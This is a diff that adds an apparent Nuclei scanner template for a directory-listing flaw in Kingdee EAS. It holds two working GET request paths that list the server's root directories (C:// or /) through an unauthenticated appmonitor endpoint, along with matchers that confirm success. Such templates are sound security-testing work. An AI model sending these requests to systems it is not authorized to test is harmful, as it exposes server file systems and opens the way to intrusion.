@@ -1,0 +1,34 @@
+id: Jindie-EAS-directory-traversal
+
+info:
+  name: 金蝶 EAS - Local File Inclusion
+  author: HuanXiong
+  severity: high
+
+  tags: File Inclusion
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/appmonitor/protected/selector/server_file/files?folder=C://&suffix="
+      - "{{BaseURL}}/appmonitor/protected/selector/server_file/files?folder=/&suffix="
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{"name":"Windows","path":"C:\\\\Windows","folder":true}'
+          - '{"name":"root","path":"/root","folder":true}'
+        condition: or
+
+      - type: word
+        words:
+          - "application/json"
+        part: header
+
+      - type: status
+        status:
+          - 200
